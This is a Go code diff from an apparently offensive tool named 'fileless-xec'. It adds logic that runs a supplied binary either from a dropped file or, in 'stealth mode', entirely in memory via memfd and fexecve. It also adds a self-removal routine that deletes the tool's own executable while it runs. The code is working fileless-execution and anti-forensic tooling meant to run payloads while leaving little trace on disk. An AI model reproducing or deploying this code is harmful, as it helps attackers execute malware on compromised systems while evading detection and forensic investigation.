@@ -1,14 +1,24 @@
 package exec
 
 import (
+	"fileless-xec/pkg/config"
 	"fmt"
 	"io/ioutil"
 	"os"
 	"os/exec"
+	"runtime"
 	"syscall"
 
 	"github.com/justincormack/go-memfd"
 )
+
+//Remove current file while its execution
+func selfRemove() {
+	err := os.Remove("./fileless-xec")
+	if err != nil {
+		fmt.Println(err)
+	}
+}
 
 //UnstealthyExec file retrieve output. TODO: output in real-time + handle input
 func UnstealthyExec(filename string, argv []string, envv []string) (err error) {
@@ -79,4 +89,37 @@ func PrepareStealthExec(content string) (mfd *memfd.Memfd) {
 	}
 
 	return mfd
+}
+
+//Exec a file witth filess-xec
+func Filelessxec(cfg *config.Config) {
+	if cfg.Unstealth || runtime.GOOS == "windows" { //Unstealth mode
+		binary := "dummy"
+		if runtime.GOOS == "windows" {
+			binary += ".exe"
+		}
+		//write binary file locally
+		err := WriteBinaryFile(binary, cfg.BinaryContent)
+		if err != nil {
+			fmt.Println(err)
+		}
+		//execute it
+		err = UnstealthyExec(binary, cfg.ArgsExec, cfg.Environ)
+		fmt.Println(err)
+
+		if cfg.SelfRm && runtime.GOOS != "windows" {
+			selfRemove()
+		}
+	} else { //Stealth mode
+
+		mfd := PrepareStealthExec(cfg.BinaryContent)
+		defer mfd.Close()
+		fd := mfd.Fd()
+
+		if cfg.SelfRm && runtime.GOOS != "windows" {
+			selfRemove()
+		}
+
+		Fexecve(fd, cfg.ArgsExec, cfg.Environ) //all line after that won't be executed due to syscall execve
+	}
 }
